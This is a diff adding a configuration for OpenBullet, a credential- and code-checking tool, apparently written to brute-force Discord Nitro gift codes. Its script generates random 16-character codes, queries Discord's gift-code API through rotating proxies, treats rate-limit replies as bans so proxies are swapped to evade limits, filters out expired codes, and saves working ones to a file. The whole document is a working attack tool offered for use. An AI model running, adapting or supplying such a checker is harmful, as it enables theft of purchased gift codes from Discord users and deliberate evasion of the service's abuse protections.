@@ -1,0 +1,103 @@
+[SETTINGS]
+{
+  "Name": "discord nitro",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2019-11-18T17:52:02.85922+00:00",
+  "AdditionalInfo": "",
+  "Author": "Antares",
+  "Version": "1.1.4",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "",
+  "DataRules": [
+    {
+      "SliceName": "PASS",
+      "RuleType": 0,
+      "RuleString": "Lowercase",
+      "Id": 764469982
+    },
+    {
+      "SliceName": "PASS",
+      "RuleType": 0,
+      "RuleString": "Uppercase",
+      "Id": 1438786383
+    },
+    {
+      "SliceName": "PASS",
+      "RuleType": 0,
+      "RuleString": "Digit",
+      "Id": 1379734072
+    },
+    {
+      "SliceName": "PASS",
+      "RuleType": 3,
+      "RuleString": "16",
+      "Id": 194096816
+    },
+    {
+      "SliceName": "PASS",
+      "RuleType": 2,
+      "RuleString": "15",
+      "Id": 114407237
+    }
+  ],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+FUNCTION RandomString "?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i" -> VAR "ant" 
+
+REQUEST GET "https://discordapp.com/api/v6/entitlements/gift-codes/$ <ant> ?with_application=false&with_subscription_plan=true" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Host: discordapp.com" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "Unknown Gift Code" 
+  KEYCHAIN Ban OR 
+    KEY "\"You are being rate limited.\"" 
+    KEY "\"You are being rate limited.\"" 
+    KEY "{ \"global\": false" 
+    KEY "\"retry_after" 
+  KEYCHAIN Success OR 
+    KEY "redeem" 
+
+PARSE "<SOURCE>" LR "\"max_uses\": " "," CreateEmpty=FALSE -> VAR "maximum" 
+
+PARSE "<SOURCE>" LR "uses\": " "," CreateEmpty=FALSE -> VAR "uses" 
+
+#CONSTANT FUNCTION Constant "<maximum>" -> VAR "max" 
+
+#CONSTANT_USE FUNCTION Constant "<uses>" -> VAR "use" 
+
+#expired KEYCHECK 
+  KEYCHAIN Custom "EXPIRED" OR 
+    KEY "<use>" EqualTo "<max>" 
+    KEY "<use>" GreaterThan "<max>" 
+  KEYCHAIN Success OR 
+    KEY "<max>" LessThan "<max>" 
+
+#sub_of_nitro PARSE "<SOURCE>" LR "name\": \"" "\"" -> CAP "Type: " 
+
+#maximum_use PARSE "<SOURCE>" LR "\"max_uses\": " "," -> CAP "Maximum uses" 
+
+#Save_Code UTILITY File "NITRO.txt" AppendLines "<ant>" 
+
